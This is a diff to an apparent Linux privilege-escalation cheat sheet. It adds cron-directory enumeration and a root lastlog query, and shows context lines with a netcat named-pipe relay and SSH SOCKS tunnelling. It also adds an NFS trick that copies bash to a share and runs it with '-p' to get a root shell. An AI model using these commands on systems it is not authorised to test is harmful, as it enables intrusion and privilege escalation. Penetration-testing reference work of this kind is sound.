@@ -45,7 +45,7 @@ who -a // As above
 w   // Who is currently logged in and what they’re doing
 last   // Listing of last logged on users
 lastlog   // Information on when all users last logged in
-lastlog –u %username% // Information on when the specified user last logged in
+lastlog --user root // Information on when the specified user last logged in
 
   == User & Privilege Information: ==
 
@@ -170,6 +170,9 @@ cat /etc/at.deny
 cat /etc/cron.allow
 cat /etc/cron.deny
 cat /etc/crontab
+ls -alh  /etc/cron.daily
+ls -alh  /etc/cron.weekly
+ls -alh  /etc/cron.monthly
 cat /etc/anacrontab
 cat /var/spool/cron/crontabs/root
 
@@ -437,6 +440,11 @@ mknod backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhost 8
 ## Is tunnelling possible? Send commands locally, remotely
 ssh -D 127.0.0.1:9050 -N [username]@[ip] 
 proxychains ifconfig
+
+#copy bash to a new subshell
+mount a NFS share from a remote server, copy bash from local to remote and execute
+cp -p ./bash /mnt/share/newbash
+./newbash -p
 
     == Preparation & Finding Exploit Code ==
 ## What development tools/languages are installed/supported?
